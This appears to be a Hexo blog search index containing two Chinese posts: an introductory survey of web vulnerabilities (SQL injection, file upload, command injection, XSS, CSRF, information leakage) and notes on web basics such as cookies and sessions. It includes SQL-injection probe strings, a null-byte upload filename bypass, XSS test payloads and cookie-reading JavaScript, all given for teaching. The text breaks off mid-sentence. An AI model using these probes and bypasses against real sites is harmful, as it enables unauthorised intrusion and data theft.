<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>常见漏洞分析</title>
      <link href="/2019/03/04/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2019/03/04/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">常见漏洞分析介绍</font></center><h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a><font color="#FF0000">SQL注入漏洞</font></h1><hr><ol><li>介绍：SQL注入是恶意用户通过把精心构造的SQL语句当做查询参数的一部分提交给Web服务器应用程序，最终欺骗服务器执行恶意的SQL命令并导致用户信息泄露甚至是服务器被控制的漏洞。<br><img src="https://s2.ax1x.com/2019/03/05/kj36Nq.png" alt="image"></li><li>判断是否存在注入：(and 1=1 / and 1=2)</li><li>判断有多少列:(order by n)</li><li>判断数据显示点:(union select 1,2,3,…)</li><li>查看数据库基本信息:(union select 1,version(),database())</li></ol><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a><font color="#FF0000">文件上传漏洞</font></h1><hr><ol><li>文件上传流程：前端校验-&gt;http协议传输-&gt;web应用程序校验-&gt;web应用程序储存-&gt;web应用程序解析执行<br><img src="https://s2.ax1x.com/2019/03/05/kXTmRI.png" alt="image"></li><li>类型分析：<br>①任意文件上传：Web应用系统没有对用户上传的文件做任何校验就直接上传到Web服务器。恶意用户可以直接上传一句话木马到Web服务器，从而控制Web服务器。 (开发人员测试代码没有删除、上传文件经过压缩编码、通过特定的客户端上传，如APP)<br>②绕过js检验上传：Web应用系统虽然对用户上传的文件进行了校验，但是校验是通过前端javascript代码完成的。由于恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传文件，就会导致基于js的校验很容易被绕过。绕过方法有：修改前端JavaScript、使用Burp Suite篡改上传的文件。<br>③后端上传代码校验绕过：一般根据绕过Web应用校验的方法可以分为：绕过文件类型校验(部分Web应用系统判定文件类型是通过content-type字段，测试人员可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验)、绕过扩展名验证(一般针对黑名单的Web应用系统。黑名单检测方式一般有个专门的blacklist文件或者列表，里面会包含常见的危险脚本文件类型，所有在黑名单中的文件都不允许上传。)、绕过文件头校验(Web应用程序在检验文件类型、文件扩展名的同时，也会校验文件头，从而进一步确定文件的类型。针对这种情况，可以通过在上传的一句话木马文件的开头加入特定的文件头从而绕过这种验证方式)。<br><img src="https://s2.ax1x.com/2019/03/05/kXLZvR.png" alt="image"><br><img src="https://s2.ax1x.com/2019/03/05/kXLfaT.png" alt="image"><br>④结合00截断：在上传文件的时候，web应用程序经过一系列文件校验之后，最终调用php的内置函数move_uploaded_file保存文件。在某些版本的PHP下，该函数遇到\x00字符后悔截断路径名。测试人员通过构造包含\x00的特殊文件名就可以通过上传文件的扩展名校验，但是保存时却以非法的扩展名保存文件。(如上传文件名为”test.php\x00.jpg”这类文件可以通过文件类型必须是jpg校验，但最终在调用move_uploaded_file时遇到了\x00所以保存成了test.php)<br>⑤结合解析漏洞：Web中间件遇到特殊类型的文件时会被当成代码执行。不同的Web中间件触发解析漏洞的文件类型也不同。(IIS6.0:”test.asp;.php”会被IIS6.0当做test.php解析)</li></ol><h1 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a><font color="#FF0000">命令注入漏洞</font></h1><hr><ol><li>介绍：命令注入漏洞的危害跟web中间件的运行的权限有关。由于web应用运行在web中间件上，所以web应用会“继承”web中间件的运行权限。如果存在命令注入漏洞的web应用运行在以系统管理员身份运行的web中间件上，那么黑客就相当于拥有一个管理员权限的shell。黑客可以利用漏洞任意的执行权限允许的命令(查看系统敏感信息、添加管理员、反弹shell、下载并运行恶意代码)</li><li>命令注入漏洞本质：由于系统把用户输入进来的参数当成了要执行的命令，并且这些命令被执行了，这样就造成了命令注入漏洞。</li><li>命令注入漏洞产生原因：①web网站没有对用户提交的参数进行有效的检测过滤 ②操作系统运行一条语句执行多条命令(使用连接符和管道符)</li><li><p>连接符和管道符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command1  &amp; command2  :  先后执行command1 和 command2，无论command1执行是否成功</span><br><span class="line">command1 &amp;&amp; command2  :  先后执行command1 和 command2，只有command1执行成功时才执行command2</span><br><span class="line">command1 || command2  :  先后执行command1 和 command2，只有command1执行失败时才执行command2</span><br><span class="line">command1  | command2  :  |是管道符，将command1的执行结果传递给command2</span><br></pre></td></tr></table></figure></li><li><p>漏洞利用流程：查找可以执行命令的接口-&gt;判断是否存在命令注入-&gt;查看当前系统当前信息-&gt;查看当前用户权限-&gt;添加新用户或者反弹shell-&gt;控制目标服务器<br><img src="https://s2.ax1x.com/2019/03/05/kjttl6.png" alt="image"><br><img src="https://s2.ax1x.com/2019/03/05/kjtXBF.png" alt="image"></p></li></ol><h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a><font color="#FF0000">XSS漏洞</font></h1><hr><ol><li>介绍：XSS攻击全称：跨站脚本攻击，是为不和层叠样式表的缩写混淆，故意将跨站脚本攻击写成XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中，从而导致各种安全问题，如cookie泄漏、网站挂马。<br><img src="https://s2.ax1x.com/2019/03/06/kvio3q.png" alt="image"></li><li>XSS的原理是web应用程序混淆了用户提交的数据和js脚本的代码边界，导致浏览器把用户的输入当成了JS代码来执行</li><li>分类：<br>反射型：非持久型XSS，也就是攻击相对于受害者而言的一次性的，具体表现在受害者点击了含有的恶意JavaScript脚本的url，而Web应用程序只是不加处理的把恶意脚本“反射”回受害者的浏览器而使受害者的浏览器执行相应的脚本。<br><img src="https://s2.ax1x.com/2019/03/06/kvkWfs.png" alt="image"><br>存储型：持久型XSS，攻击者上传的包含恶意js脚本的留言等消息被Web应用程序保存到数据库中，Web应用程序在生成新的页面的时候如果包含了该恶意js脚本，这样会导致所有访问该网页的浏览器执行该恶意js脚本。这种攻击类型常见在博客、论坛等网站。<br>DOM型：DOM是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构及样式。DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞，而且不需要与服务端进行交互。客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</li><li>发现和利用：<br>反射型XSS：可以查看代码，查找关键的变量，假如用户提交的变量经过htmlEncode处理就返回，那么这个变量就很有可能存在一个反射型XSS漏洞。<br>存储型XSS：一般需要查找像留言板、发帖等网站功能，然后在留言板、帖子中插入<script>alert(“XSS”)</script>之类的测试代码。在提交成功后，可以在访问之前发布的留言或者帖子，如果弹窗了，可以那么这个位置就存在一个存储型XSS漏洞。<br>DOM型XSS：不与服务器进行交互，因此我们一般挖掘此类漏洞需要分析javascript代码。如果是自定义函数，则需要一步一步来把对方自定义的函数来搞清楚。</li><li>自动化检测XSS漏洞:在实际的渗透测试中，往往为了加快测试进度，我们可以使用一些自动化的XSS检测工具(Awvs、AppScan、w3af、XSSer、XSSF)。</li><li>XSS利用工具：BlueLotus_XSSReceiver搭建的XSS平台、XSSer.me源码搭建的XSS平台、kali下的BeFF。</li><li>XSS攻击流程：攻击者发现XSS漏洞-&gt;构造代码-&gt;发送给受害人-&gt;受害人打开-&gt;攻击者获取受害人的cookie-&gt;完成攻击</li></ol><h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a><font color="#FF0000">CSRF漏洞</font></h1><hr><ol><li>介绍：通过伪装来自受信任用户的请求来利用受信用的网站。</li><li>原理：web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账时，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用被攻击者的身份完成对应的恶意请求。 </li><li>CSRF攻击流程：发现漏洞-&gt;构造代码-&gt;发送给受害人-&gt;受害人打开-&gt;受害人执行代码-&gt;完成攻击</li><li>漏洞原理：<br><img src="https://s2.ax1x.com/2019/03/06/kvwCtg.png" alt="image"></li></ol><h1 id="信息泄露类漏洞"><a href="#信息泄露类漏洞" class="headerlink" title="信息泄露类漏洞"></a><font color="#FF0000">信息泄露类漏洞</font></h1><hr><ol><li>目录遍历：Web中间件与网站目录权限配置不当，在网站目录无索引文件(index.html、index.asp、index.php、index.jsp等)的情况下，访问该网站目录时会直接显示该目录下所有的文件及其子目录·。通过对Web中间件进行正确的配置，可以有效的避免这类漏洞。</li><li>目录遍历利用方式：如果发现web应用程序存在目录遍历漏洞，那么可以手动查找该网站的后台地址、备份文件等敏感信息。结合搜索的敏感信息，渗透测试人员可以进行下一步的渗透，如爆破管理员密码、分析网站源码等。</li><li>敏感信息泄露：一切泄露的可能危害Web服务器安全的信息。敏感信息搜集也是渗透测试中至关重要的一环。Web服务器敏感信息泄露会给黑客提供组多的攻击思路，严重威胁Web服务器的安全。一般没有直接危害，但恶意攻击者根据这些信息可以大大增加攻击面。(例：根据404信息可以推断出web中间件是weblogic，使用相关工具检测发现该版本的weblogic存在java反序列化漏洞可以执行的系统命令)</li><li>敏感信息泄露分类：Web服务器敏感信息泄露(Web服务器开放端口、Web服务器开放服务器类型、Web服务器开放服务版本)Web中间价敏感信息泄露(Web中间件类型、Web中间件版本、Web中间件后台地址)Web应用程序敏感信息泄露(Web应用程序脚本程序版本、Web应用程序开发框架、Web应用程序cms类型、Web应用程序后台地址、敏感目录、API等、Web应用程序安装目录信息、Web应用程序开发遗留文件、Web应用程序采用的第三方插件的类型和版本信息、Web应用程序的whois信息)</li><li>敏感信息泄露防御：对Web服务器敏感信息泄露的防御措施(修改安装的服务的默认端口、屏蔽安装的服务的版本信息)，对Web中间件敏感信息泄露的防御措施(屏蔽Web中间件版本信息、修改Web中间件默认的后台地址)，对Web应用程序敏感信息泄露的防御措施(屏蔽采用的网站框架和模板、修改默认网站的后台路径、删除开发遗留的版本控制文件、对网站的whois信息采取隐私保护措施)</li><li>任意文件读取漏洞介绍：一般的网站提供读取文件功能，常规的思路是使用一个动态页面(php、jsp、aspx、asp等)将待下载的文件作为参数，根据不同的参数值下载不同的文件。如果网站配置不当，并且没有对用户下载的文件参数进行有效的过滤检测，恶意用户就会下载任意文件，如web的数据库配置文件等。<br><img src="https://s2.ax1x.com/2019/03/07/kv4La4.png" alt="image"></li><li>任意文件读取漏洞危害：属于一种高位的Web安全漏洞，这种漏洞会泄露网站敏感信息导致网站处于极度不安全状态(下载服务器任意文件，如脚本代码、服务及系统配置文件等)(根据Web应用源代码进一步进行代码审计，得到更多可利用的漏洞)</li><li>任意文件读取漏洞利用：手工挖掘任意文件读取漏洞需要注意网站提供的下载功能。(从链接上看：readfile.php?file=<strong><em>.txt 、 download.php?file+</em></strong>.rar)(从参数名看：RealPath=、FilePath=、inputFile)。找到可以的参数值后，替换下载的文件名为下列敏感的系统文件。如果下载成功，证明存在任意文件读取漏洞。利用任意文件读取漏洞，可以通过分析Web应用程序各个文件之间的调用关系，下载整个Web应用程序源代码。从源代码当中可以分析出数据库账号密码、后台路径等敏感信息，渗透测试人员也可以对网站源代码进行代码审计，深入挖掘各类漏洞。</li></ol><p>#未完待续……</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入漏洞 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 命令注入漏洞 </tag>
            
            <tag> XXS漏洞 </tag>
            
            <tag> CSRF漏洞 </tag>
            
            <tag> 信息泄露类漏洞 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Web基础知识理论</title>
      <link href="/2019/03/03/Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%90%86%E8%AE%BA/"/>
      <url>/2019/03/03/Web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%90%86%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">Web知识</font></center><h1 id="HTTTP代理"><a href="#HTTTP代理" class="headerlink" title="HTTTP代理"></a><font color="#FF0000">HTTTP代理</font></h1><hr><p>HTTP代理原理：代理位于浏览器和Web服务器之间，有了他之后，浏览器不是直接连接Web服务器去取回网页而是向HTTP代理发出请求，请求数据包会先送到HTTP代理，由HTTP代理来取回浏览器所需要的信息并传送给你的浏览器。<br>简而言之，HTTP代理位于浏览器和Web服务器之间，充当“中间人” 的角色。<br>代理的作用：通过代理我们可以查看、分析浏览器和Web服务器之间的HTTP通信数据。通过查看HTTP流浪，我们可以方便的测试各种Web漏洞，如SQL注入、文件上传、弱口令。<br><img src="https://s2.ax1x.com/2019/03/03/kLoJ8P.png" alt="image"></p><h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a><font color="#FF0000">webshell</font></h1><hr><p>webshell是以sap、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以称为网页后门。黑客们在入侵一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</p><h1 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a><font color="#FF0000">子网掩码</font></h1><hr><p>一种用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。子网掩码是一个32位地址，用于屏蔽IP地址的一部分以区别网络标识和主机标识，并说明该IP地址是在局域网上，还是在远程网上。对于A类地址来说，默认的子网掩码是255.0.0.0；对于B类地址来说默认的子网掩码是255.255.0.0；对于C类地址来说默认的子网掩码是255.255.255.0。<br>定义子网掩码的步骤为：<br>A、确定哪些组地址归我们使用。比如我们申请到的网络号为 “210.73.a.b”，该网络地址为c类IP地址，网络标识为“210.73.a”，主机标识为“b”。<br>B、根据我们所需的子网数以及将来可能扩充到的子网数，用宿主机的一些位来定义子网掩码。比如我们需要12个子网，将来可能需要16个。用第四个字节的前四位确定子网掩码。前四位都置为“1”，即第四个字节为“11110000”，这个数我们暂且称作新的二进制子网掩码。<br>C、把对应初始网络的各个位都置为“1”，即前三个字节都置为“1”，则子网掩码的间断二进制形式为：“11111111.11111111.11111111.11110000”。<br>D、把这个数转化为间断十进制形式为：“255.255.255.240” 。  </p><h1 id="默认网关"><a href="#默认网关" class="headerlink" title="默认网关"></a><font color="#FF0000">默认网关</font></h1><hr><p>网关在传输层上以实现网络互连，是最复杂的网络互连设备，仅用于两个高层协议不同的网络互连。网关既可以用于广域网互连，也可以用于局域网互连。网关是一种充当转换重任的计算机系统或设备。在使用不同的通信协议、数据格式或语言，甚至体系结构完全不同的两种系统之间，网关是一个翻译器。与网桥只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同时，网关也可以提供过滤和安全功能。在没有路由器的情况下，两个网络之间是不能进行TCP/IP通信的，即使是两个网络连接在同一台交换机（或集线器）上，TCP/IP协议也会根据子网掩码（255.255.255.0）判定两个网络中的主机处在不同的网络里。而要实现这两个网络之间的通信，则必须通过网关。如果网络A中的主机发现数据包的目的主机不在本地网络中，就把数据包转发给它自己的网关，再由网关转发给网络B的网关，网络B的网关再转发给网络B的某个主机。网络B向网络A转发数据包的过程也是如此。所以说，只有设置好网关的IP地址，TCP/IP协议才能实现不同网络之间的相互通信。就好像一个房间可以有多扇门一样，一台主机可以有多个网关。默认网关的意思是一台主机如果找不到可用的网关，就把数据包发给默认指定的网关，由这个网关来处理数据包。现在主机使用的网关，一般指的是默认网关。<br>这就是为什么我们在路由器上网的时候，必须要把计算机中的默认网关地址设置成路由器LAN接口地址的原因，因为路由器的LAN接口就是你所在网络的网关，你的电脑要上网，数据必须经过网关转发出去。在一般的路由器网络中，默认网关最常见的一般是：192.168.1.1和192.168.0.1，也就是路由器LAN接口的默认IP地址。当然，也有一些智能路由器会使用其它IP地址作为默认网关，这个主要是路由器厂商出厂前设定的。  </p><h1 id="DNS服务器地址"><a href="#DNS服务器地址" class="headerlink" title="DNS服务器地址"></a><font color="#FF0000">DNS服务器地址</font></h1><hr><p>互联网上的每一台电脑都被分配一个IP地址，数据的传输实际上是在不同IP地址之间进行的。包括我们在家上网时使用的电脑，在连上网以后也被分配一个IP地址，这个IP地址绝大部分情况下是动态的。也就是说你关掉调制解调器，再重新打开上网，你的上网接入商会随机分配一个新的IP地址。<br>网站服务器本质上也是一台连上网的电脑，只不过配置上更适合作为服务器，并且放在数据中心，保持低温，低尘环境，同时有安全保卫。这些服务器使用固定IP地址连入互联网。<br>一个域名解析到某一台服务器上，并且把网页文件放到这台服务器上，用户的电脑才知道去哪一台服务器获取这个域名的网页信息。这是通过域名服务器来实现的。<br>域名服务器是英文Domain Name Server的缩写。每一个域名都至少要有两个DNS服务器，这样如果其中一个DNS服务器出现问题，另外一个也可以返回关于这个域名的数据。DNS服务器也可以有两个以上，但所有这些DNS服务器上的DNS记录都应该是相同的。<br>在DNS服务器中保留有该域名的DNS记录，比如A记录，MX记录。A记录是用来指定主机名（或域名）对应的IP地址。MX记录用来解析域名的邮件服务器。在很多情况下。<br>当一个浏览者在浏览器地址框中打入某一个域名，或者从其他网站点击了链接来到了这个域名，浏览器向这个用户的上网接入商发出域名请求，接入商的DNS服务器要查询域名数据库，看这个域名的DNS服务器是什么。然后到DNS服务器中抓取DNS记录，也就是获取这个域名指向哪一个IP地址。在获得这个IP信息后，接入商的服务器就去这个IP地址所对应的服务器上抓取网页内容，然后传输给发出请求的浏览器。<br>这个过程描述起来蛮复杂，但实际上不到一两秒钟就完成了。<br><img src="https://s2.ax1x.com/2019/03/01/kbV2Oe.png" alt="image"></p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><font color="#FF0000">Cookie</font></h1><hr><ol><li>Cookie机制：介绍Cookie通过在客户端记录信息确定用户身份。就像购物一样，一个顾客的东西应该对应放入他的购物篮。那么一个用户的请求应该同属一个会话，而另一个用户的所有请求应该属于另外一个会话。<br>但是Web应用程序是使用的HTTP协议传输数据的，HTTP是无状态协议(无状态是指协议对于事务处理没有记忆能力)。这意味着服务器无法从连接上跟踪会话，也无法知道客户身份，单次连接都需要建立新的连接。而cookie就可以弥补HTTP协议无状态的不足。</li><li>什么是Cookie：Cookie就相当于服务端给客户端颁发的通行证，而客户端访问时，都必须提供自己的通行证。<br>Cookie实际上是一小段的文本信息。客户端请求服务器，如果服务器需要记录该用户状态，就使用response向客户端浏览器颁发一个Cookie。客户端浏览器会把Cookie保存起来。当浏览器再请求该网站时，浏览器把请求的网址连同该Cookie一同提交给服务器。服务器检查该Cookie，以此来辨认用户状态。服务器还可以根据需要修改Cookie的内容。</li><li>Cookie信息查看：不同网站对其颁布的Cookie都会进行不同的加密或者处理。<br>IE浏览器会在“C:\Documents and Settings\你的用户名\Cookies”文件夹下以文本文件形式保存，一个文本文件保存一个Cookie。<br>在浏览器的地址栏输入：javascript:alert(document.cookie)  (不区分大小写)，就会弹出你在当前网页登录的cookie信息。（但是当你尝试这样去查看当前网站的Cookie时，你会发现javascript字符串消失不见了，应为会被自动过滤隐藏，只需在前面加个1再复制后删去1即可。）</li><li>Cookie作用：<br>①记录用户访问次数。<br>②Cookie不可跨域名性(不同域名的cookie不可相互使用)<br>③中文属于Unicode字符，内存中占四个字符Cookie中需要对他进行编码(Cookie中保存中文只能编码。一般使用UTF-8编码即可。不推荐使用GBK等中文编码，因为浏览器不一定支持，而且JavaScript也不支持GBK编码。)<br>④Cookie还可以使用二进制，如数字证书。</li><li>Cookie内容：<br>①Cookie内容应该少而精(否则会影响速度)<br>②常用属性：<br><font color="#FF0000">String name</font>：该Cookie的名称。Cookie一旦创建，名称便不可更改<br><font color="#FF0000">Object value</font>：该Cookie的值。如果值为Unicode字符，需要为字符编码。如果值为二进制数据，则需要使用BASE64编码<br><font color="#FF0000">int maxAge</font>：该Cookie失效的时间，单位秒。如果为正数，则该Cookie在maxAge秒之后失效。如果为负数，<br>Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示删除该Cookie。默认为–1<br><font color="#FF0000">boolean secure</font>：该Cookie是否仅被使用安全协议传输。安全协议。安全协议有HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为false<br><font color="#FF0000">String path</font>：该Cookie的使用路径。如果设置为“/sessionWeb/”，则只有contextPath为“/sessionWeb”的程序可以访问该Cookie。如果设置为“/”，则本域名下contextPath都可以访问该Cookie。注意最后一个字符必须为“/”<br><font color="#FF0000">String domain</font>：可以访问该Cookie的域名。如果设置为“.google.com”，则所有以“google.com”结尾的域名都可以访问该Cookie。注意第一个字符必须为“.”<br><font color="#FF0000">String comment</font>：该Cookie的用处说明。浏览器显示Cookie信息的时候显示该说明<br><font color="#FF0000">int version</font>：该Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范</li><li>Cookie有效期：<br>①Cookie的<font color="#FF0000">maxAge函数</font>决定着Cookie的有效期，单位为秒（Second）。 Cookie中通过getMaxAge()方法与setMaxAge(int maxAge)方法来读写maxAge属性。<br>②如果maxAge属性为正数，则表示该Cookie会在maxAge秒之后自动失效。浏览器会将maxAge为正数的Cookie持久化，即写到对应的Cookie文件中。无论客户关闭了浏览器还是电脑，只要还在maxAge秒之前，登录网站时该Cookie仍然有效。<br>③如果maxAge为负数，则表示该Cookie仅在本浏览器窗口以及本窗口打开的子窗口内有效，关闭窗口后该Cookie即失效。maxAge为负数的Cookie，为临时性Cookie，不会被持久化，不会被写到Cookie文件中。Cookie信息保存在浏览器内存中，因此关闭浏览器该Cookie就消失了。Cookie默认的maxAge值为–1。<br>④如果maxAge为0，则表示删除该Cookie。Cookie机制没有提供删除Cookie的方法，因此通过设置该Cookie即时失效实现删除Cookie的效果。失效的Cookie会被浏览器从Cookie文件或者内存中删除。</li><li>Cookie的删除和修改：<br>①Cookie不提供直接删除和修改的操作。<br>②修改某个Cookie，只需要新建一个同名的Cookie，添加到response中覆盖原来的Cookie(修改需要的数据)<br>③删除某个Cookie，只需要新建一个同名的Cookie，添加到response中覆盖原来的Cookie(设置maxAge为0)<br>④修改、删除Cookie时，新建的Cookie除value、maxAge之外的所有属性，例如name、path、domain等，都要与原Cookie完全一样。否则，浏览器将视为两个不同的Cookie不予覆盖，导致修改、删除失败。</li><li>Cookie的域名性：Cookie是不可以跨域名的。Cookie的隐私安全机制能够禁止网站非法获取其他网站的Cookie。同一个域名下的两个二级域名。”1.haha.cm”和”2.haha.cm”也不能交互使用Cookie，需要设置Cookie的domain参数为：cookie.setDomain(“.helloweenvsfei.com”);才可以！<br>domain参数必须以点(“.”)开始。另外，name相同但domain不同的两个Cookie是两个不同的Cookie。如果想要两个域名完全不同的网站共有Cookie，可以生成两个Cookie，domain属性分别为两个域名，输出到客户端。</li><li><p>Cookie的路径：domain属性决定运行访问Cookie的域名，而path属性决定允许访问Cookie的路径<br>如：如果只允许/sessionWeb/下的程序使用Cookie，可以这么写：  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">"time"</span>,<span class="string">"20080808"</span>);   S<span class="comment">// 新建Cookie</span></span><br></pre></td></tr></table></figure><p>注意：设置为“/”时允许所有路径使用Cookie。 path属性需要使用符号“/”结尾。 name相同但domain相同的两个Cookie也是两个不同的Cookie。</p></li><li><p>Cookie的安全属性：HTTP协议不仅是无状态的，而且是不安全的。使用HTTP协议的数据不经过任何加密就直接在网络上传播，有被截获的可能。使用HTTP协议传输很机密的内容是一种隐患。如果不希望Cookie在HTTP等非安全协议中传输，可以设置Cookie的secure属性为true。浏览器只会在HTTPS和SSL等安全协议中传输此类Cookie。<br>下面的代码设置secure属性为true： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">"time"</span>, <span class="string">"20080808"</span>);<span class="comment">// 新建Cookie  </span></span><br><span class="line">cookie.setSecure(<span class="keyword">true</span>);                         <span class="comment">// 设置安全属性  </span></span><br><span class="line">response.addCookie(cookie);                     <span class="comment">// 输出到客户端</span></span><br></pre></td></tr></table></figure><p>注意：secure属性并不能对Cookie内容加密，因而不能保证绝对的安全性。如果需要高安全性，需要在程序中对Cookie内容加密、解密，以防泄密。</p></li><li><p>JavaScript操作Cookie：Cookie是保存在浏览器端的，因此浏览器具有操作Cookie的先决条件。浏览器可以使用脚本程序如JavaScript或者VBScript等操作Cookie。这里以JavaScript为例介绍常用的Cookie操作。例如下面的代码会输出本页面所有的Cookie。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="built_in">document</span>.cookie);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>由于JavaScript能够任意地读写Cookie，有些好事者便想使用JavaScript程序去窥探用户在其他网站的Cookie。不过这是徒劳的，W3C组织早就意识到JavaScript对Cookie的读写所带来的安全隐患并加以防备了，<font color="#FF0000">W3C标准的浏览器会阻止JavaScript读写任何不属于自己网站的Cookie</font>。换句话说，A网站的JavaScript程序读写B网站的Cookie不会有任何结果。</p></li></ol><h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a><font color="#FF0000">Session</font></h1><hr><ol><li>Session机制：除了使用Cookie，Web应用程序中还经常使用Session来记录客户端状态。Session是服务器端使用的一种记录客户端状态的机制，使用上比Cookie简单一些，相应的也增加了服务器的存储压力。</li><li>Session介绍：Session通过在服务器端记录信息确定用户身份。<br>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。<br>客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。(所以增加了服务器的存储压力)<br>如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话。那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。</li><li>Session实现用户登录：Session对应的类为javax.servlet.http.HttpSession类。<br>每个来访者对应一个Session对象，所有该客户的状态信息都保存在这个Session对象里。Session对象是在客户端第一次请求服务器的时候创建的。<br>注意：程序中Session中直接保存了Person类对象与Date类对象，使用起来要比Cookie方便。多个客户端执行程序时，服务器会保存多个客户端的Session。获取Session的时候也不需要声明获取谁的Session。Session机制决定了当前客户只会获取到自己的Session，而不会获取到别人的Session。各客户的Session也彼此独立，互不可见。</li><li>Session的生命周期：<br>①保存：Session保存在服务器端。为了获得更高的存取速度，服务器一般把Session放在内存里。每个用户都会有一个独立的Session。如果Session内容过于复杂，当大量客户访问服务器时可能会导致内存溢出。因此，Session里的信息应该尽量精简。<br>②自动创建：Session在用户第一次访问服务器的时候自动创建。需要注意只有访问JSP、Servlet等程序时才会创建Session，只访问HTML、IMAGE等静态资源并不会创建Session。如果尚未生成Session，也可以使用request.getSession(true)强制生成Session。<br>③访问更新：Session生成后，只要用户继续访问，服务器就会更新Session的最后访问时间，并维护该Session。用户每访问服务器一次，无论是否读写Session，服务器都认为该用户的Session“活跃（active）”了一次。<br>④自动清除：由于会有越来越多的用户访问服务器，因此Session也会越来越多。为防止内存溢出，服务器会把长时间内没有活跃的Session从内存删除。这个时间就是Session的超时时间(maxInactiveInterval属性)。如果超过了超时时间没访问过服务器，Session就自动失效了。</li><li>Session常用方法函数：<br><font color="#FF0000">void setAttribute(String attribute, Object value)</font><br>设置Session属性。value参数可以为任何Java Object。通常为java Bean。value信息不宜过大<br><font color="#FF0000">String getAttribute(String attribute)</font><br>返回Session属性<br><font color="#FF0000">Enumeration getAttributeNames()</font><br>返回Session中存在的属性名<br><font color="#FF0000">void removeAttribute(String attribute)</font><br>移除Session属性<br><font color="#FF0000">String getId()</font><br>返回Session的ID。该ID由服务器自动创建，不会重复<br><font color="#FF0000">long getCreationTime()</font><br>返回Session的创建日期。返回类型为long，常被转化为Date类型<br>例如：Date createTime = new Date(session.get CreationTime())<br><font color="#FF0000">long getLastAccessedTime()</font><br>返回Session的最后活跃时间。返回类型为long<br><font color="#FF0000">int getMaxInactiveInterval()</font><br>返回Session的超时时间。单位为秒。超过该时间没有访问，服务器认为该Session失效<br><font color="#FF0000">void setMaxInactiveInterval(int second)</font><br>设置Session的超时时间。单位为秒<br><font color="#FF0000">void putValue(String attribute, Object value)</font><br>不推荐的方法。已经被setAttribute(String   attribute, Object Value)替代<br><font color="#FF0000">Object getValue(String attribute)</font><br>不被推荐的方法。已经被getAttribute(String   attr)替代<br><font color="#FF0000">boolean isNew()</font><br>返回该Session是否是新创建的<br><font color="#FF0000">void invalidate()</font><br>使该Session失效</li><li>Session对浏览器的要求：<br>①Session依据该Cookie来识别是否为同一用户。虽然Session保存在服务器，对客户端是透明的，它的正常运行仍然需要客户端浏览器的支持，因为Session需要使用Cookie作为识别标志。HTTP协议是无状态的，Session不能依据HTTP连接来判断是否为同一客户，因此服务器向客户端浏览器发送一个名为JSESSIONID的Cookie，它的值为该Session的id（也就是HttpSession.getId()的返回值）。它的maxAge属性一般为–1。<br>②但是如果将Cookie功能禁用，或者不支持Cookie怎么办。比如绝大数手机浏览器都不支持Cookie，Java 